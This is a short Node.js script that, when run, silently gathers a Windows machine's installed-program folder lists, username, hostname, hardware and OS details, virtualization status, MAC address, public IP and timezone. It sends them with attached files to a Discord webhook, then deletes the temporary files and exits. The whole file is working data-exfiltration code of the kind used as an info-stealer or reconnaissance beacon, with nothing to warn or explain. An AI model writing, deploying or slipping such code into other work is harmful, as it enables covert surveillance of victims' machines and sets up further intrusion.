//Dependencies
const SystemInformation = require("systeminformation")
const Public_IP = require("public-ip")
const Discord = require("discord.js")
const Fs = require("fs")
const Os = require("os")

//Variables
const Webhook = new Discord.WebhookClient("webhookid", "webhooktoken")

//Functions
async function Get_Public_IP(){
    const IP = await Public_IP.v4()

    return IP
}

//Main
Send()
async function Send(){
    const Program_Files = Fs.readdirSync("C:\\Program Files", { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
    const Program_Files_x86 = Fs.readdirSync("C:\\Program Files (x86)", { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
    const Program_Data = Fs.readdirSync("C:\\ProgramData", { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Fs.writeFileSync("./pf.txt", JSON.stringify(Program_Files), "utf8")
    Fs.writeFileSync("./pfx86.txt", JSON.stringify(Program_Files_x86), "utf8")
    Fs.writeFileSync("./pd.txt", JSON.stringify(Program_Data), "utf8")

    const Network = await SystemInformation.networkInterfaces()
    const System = await SystemInformation.system()
    const OSI = await SystemInformation.osInfo()
    const Time = await SystemInformation.time()
    Webhook.send("```" + `OS Platform: ${Os.platform()}
OS Name: ${Os.userInfo().username}
OS Hostname: ${Os.hostname()}
OS Homedir: ${Os.userInfo().username}
OS Arch: ${OSI.arch}
OS Kernel: ${OSI.release}
OS Manufacturer: ${System.manufacturer}
OS Model: ${System.model}
Is Virtual OS: ${System.virtual}

Interface Name: ${Network[0].ifaceName}
Interface: ${Network[0].iface}
Mac: ${Network[0].mac}
    
Public IP: ${await Get_Public_IP()}

Current Time: ${Time.current}
Timezone Name: ${Time.timezoneName}
Timezone: ${Time.timezone}` + "```", { files: ["pf.txt", "pfx86.txt", "pd.txt"] }).then(()=>{
        Fs.unlinkSync("./pd.txt")
        Fs.unlinkSync("./pf.txt")
        Fs.unlinkSync("./pfx86.txt")
        process.exit()
    }).catch(()=>{
        process.exit()
    })
}
